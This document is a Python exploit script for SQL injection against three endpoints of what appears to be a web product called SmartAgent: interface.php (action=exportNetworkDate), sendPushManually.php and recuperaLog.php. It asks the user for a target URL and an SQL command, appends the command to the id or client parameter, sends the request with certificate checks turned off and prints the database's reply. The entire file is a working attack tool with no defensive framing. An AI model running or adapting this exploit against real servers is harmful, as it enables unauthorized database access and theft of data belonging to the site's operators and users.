import requests


def exploit_post_request(url):
    sqlcommand = input("Enter the SQL command you want to run (EX: UNION SELECT @@version): ")

    postdata = {
        "action": "exportNetworkDate",
        "id": "1111" + sqlcommand
    }

    response = requests.post(url, data=postdata, verify=False)
    print("\nResponse from server:\n")
    print(response.text)


def exploit_get_request_send_push(url):
    sqlcommand = input("Enter the SQL command you want to run (EX: UNION SELECT @@version): ")

    parameters = {
        "id": "123" + sqlcommand
    }

    response = requests.get(url, params=parameters, verify=False)
    print("\nResponse from server:\n")
    print(response.text)


def exploit_get_request_recupera_log(url):
    sqlcommand = input("Enter the SQL command you want to run (EX: UNION SELECT @@version): ")

    parameters = {
        "client": "1111" + sqlcommand
    }

    response = requests.get(url, params=parameters, verify=False)
    print("\nResponse from server:\n")
    print(response.text)


def main():
    print("Choose the endpoint to exploit:")
    print("1. POST request to interface.php (action=exportNetworkDate)")
    print("2. GET request to sendPushManually.php (id parameter)")
    print("3. GET request to recuperaLog.php (client parameter)")

    choice = input("Enter the number of the endpoint you want to exploit: ")
    url = input("Enter the target URL (e.g., https://smartagent.[client].com): ")

    if choice == '1':
        exploit_post_request(url + "/privateArea/common/tests/interface.php")
    elif choice == '2':
        exploit_get_request_send_push(url + "/privateArea/common/qoe/sendPushManually.php")
    elif choice == '3':
        exploit_get_request_recupera_log(url + "/recuperaLog.php")
    else:
        print("Invalid choice. Exiting.")


if __name__ == "__main__":
    # Disable warnings related to insecure HTTPS requests
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
    main()
